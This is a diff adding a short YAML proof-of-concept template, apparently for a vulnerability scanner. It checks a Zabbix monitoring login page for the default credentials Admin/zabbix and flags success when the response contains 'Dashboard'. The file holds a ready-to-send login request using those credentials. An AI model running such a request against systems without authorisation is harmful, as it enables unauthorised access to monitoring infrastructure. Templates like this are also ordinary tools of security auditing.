@@ -1,0 +1,18 @@
+name: poc-yaml-ZABBIX-监控系统-default-passwd
+description: "登录方式:Admin/zabbix"
+method: POST
+body: "name=Admin&password=zabbix&autologin=1&enter=Sign+in"
+headers:
+  Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+  Accept: "*/*"
+  X-Requested-With: "XMLHttpRequest"
+  Agent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+  Encoding: "gzip, deflate"
+  Accept-Language:  "zh-CN,zh;q=0.9"
+  Connection: "close"
+path:
+  - /index.php
+expression:
+  status: 200
+  body_all:
+    - "Dashboard"
